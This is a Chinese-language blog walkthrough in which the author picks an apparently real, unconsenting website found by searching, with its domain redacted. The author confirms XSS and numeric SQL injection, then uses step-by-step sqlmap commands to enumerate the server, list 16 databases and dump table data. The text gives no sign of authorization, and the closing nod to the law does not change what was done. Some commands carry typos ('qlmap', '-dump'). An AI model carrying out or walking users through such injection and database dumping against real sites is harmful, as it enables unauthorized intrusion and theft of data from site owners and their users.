**盛年不重来,一日难再晨**  
在茫茫大海中，终于等到了你的到来！  
在不断的搜索中，终于找到了一个“可爱啊”的网站，现在准备开饭了！  
![image.png](https://image.3001.net/images/20210526/1621999707_60adc05ba793a2c69e885.png!small)在这就绕过信息收集这个步骤了，在初步拿到这个网站时，首先要注意网站的结构，server之类的。  
 **BEGIN**

> 在网站代码后面输入JaveaScript测试代码 ;出现弹窗，证明存在一个小的XSS，是否存在更多的XSS漏洞信息，以后再做补充。

![image.png](https://image.3001.net/images/20210526/1621999955_60adc1532f16e9dc8b351.png!small)

除此之后，我们对其他漏洞页进去了测试，结果居然有了！！!

![image.png](https://image.3001.net/images/20210526/1622000057_60adc1b9d163694f6d14b.png!small)

可以发现，存在数字型的SQL注入点；于是用了传统的方法对网站进行了sql测试

> http://www.xxxxxx.net/main.php?id=35 and 1=1
> ;http://www.xxxxx.net/main.php?id=35 or 1=1

![image.png](https://image.3001.net/images/20210526/1622000240_60adc27065381142e8f10.png!small)

虽然输入这个判断其可能存在注入点，但是还是需要进一步测试

现在我们用kali中的sqlmap进行扫描；

> sqlmap -u http://www.xxxxxx.net/main.php?id=35

![image.png](https://image.3001.net/images/20210526/1622000323_60adc2c37ad7909b1b920.png!small)

从扫描的结果可以知道，数据库为Mysql，Apach版本为2.0.47，PHP版本为5.1.4，属于高版本，由前面的知识点可以判定肯定存在'information_schema'这个数据库；

接下来，我们将查询该网站可能存在的其他数据库

> sqlmap -u http://www.xxxxx.net/main.php?id=35 --dbs

![image.png](https://image.3001.net/images/20210526/1622000389_60adc305d5f563c9f116a.png!small)

我们可以看到，这个网站存在16个数据库，其中应该有我们想要看的东西（切记 只能看，不能改哟）

于是我进入到了刚才提到的‘information_schema'这个数据库中

> 第一：查看该数据库的所有表名 sqlmap -u http://www.xxxxx/main.php?id=35 -D
> information_schema --tables  
>
> ![image.png](https://image.3001.net/images/20210526/1622000430_60adc32ebe24d63266cdd.png!small)

> 第二：选择其中一个表，查看其字段 qlmap -u http://www.xxxxxx.net/main.php?id=35 -D
> information_schema -T TABLES --columns

![image.png](https://image.3001.net/images/20210526/1622000478_60adc35e206d21b0f27b4.png!small)

> 第三：查看字段中的数据值 sqlmap -u http://www.xxxx.net/main.php?id=35
> -Dinformation_schema -C TABLE_NAME -dump  
>
> ![image.png](https://image.3001.net/images/20210526/1622000557_60adc3ad525573a98de0f.png!small)  
>
> ![image.png](https://image.3001.net/images/20210526/1622000577_60adc3c16db621446e754.png!small)

既然这个网站存在一些漏洞，我们也得遵守法律，也就到这儿吧！

